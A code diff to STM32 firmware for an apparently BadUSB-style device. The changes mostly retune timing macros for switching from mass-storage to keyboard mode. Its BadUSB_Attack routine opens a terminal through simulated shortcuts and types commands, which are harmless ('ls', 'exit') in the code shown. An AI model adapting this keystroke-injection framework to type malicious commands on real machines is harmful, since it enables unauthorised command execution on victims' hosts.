@@ -248,11 +248,24 @@ void SystemClock_Config(void);
 /* Private user code ---------------------------------------------------------*/
 /* USER CODE BEGIN 0 */
 #define MapLen 133
-//You can adjust StrokeSlot to ensure the the correctness and stability of the output
-#define StrokeSlot 35
-#define PlugSlot 50
-//linux ShortcutSlot 500
-#define ShortcutSlot 500
+#define Target FPGA
+
+/*You can adjust following configure Slot:
+ * to ensure the the correctness and stability of the output*/
+#if Target == FPGA
+  #define StrokeSlot 35
+  #define PlugSlot 50
+  #define ShortcutSlot 500
+  #define SwitchDeviceSlot 3000
+  #define InjectStringSlot 1000
+#elif Target == Desktop
+  #define StrokeSlot 35
+  #define PlugSlot 50
+  #define ShortcutSlot 500
+  #define SwitchDeviceSlot 1000
+  #define InjectStringSlot 1000
+#endif
+
 uint8_t sent_buffer[USBD_CUSTOMHID_OUTREPORT_BUF_SIZE];
 
 uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];
@@ -353,7 +366,6 @@ int main(void)
 		  while(1){
 			  if(!Flash_Busy){
 				  SwitchToHID();
-				  HAL_Delay(1000); //test Device Manager linux 2000
 				  //Attack begin
 				  BadUSB_Attack(0);
 				  break;
@@ -446,6 +458,7 @@ void SwitchToHID(){
 	SimulateUSB_plugin();
 	MX_TIM2_Init();
 	MX_USB_DEVICE_Init();
+	HAL_Delay(SwitchDeviceSlot);
 }
 
 void SwitchToMSC(){
@@ -454,7 +467,7 @@ void SwitchToMSC(){
 	HAL_Delay(PlugSlot);
 	SimulateUSB_plugin();
 	MX_USB_DEVICE_Init_MSC();
-	HAL_Delay(PlugSlot*10);
+	HAL_Delay(SwitchDeviceSlot);
 }
 
 void Get_Single_Descriptor(uint8_t ascii){
@@ -572,7 +585,6 @@ void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 		char AttackStr[256];
 		strcpy(AttackStr, "ls\n\nexit\n\n");
 		SimulateShortcutKey(StartLinuxTerminal, 3);
-		HAL_Delay(1000);
 		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 	}else if(type == 1){
 		uint8_t StartWindowsTerminal[2] = {132, 'R'};
@@ -581,7 +593,7 @@ void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 		strcpy(AttackStr1, "ls -a\n\nexit\n");
 		SimulateShortcutKey(StartWindowsTerminal, 2);
 		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
-		HAL_Delay(1000);
+		HAL_Delay(InjectStringSlot);
 		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 	}else{    //test
 		char AttackStr[256];
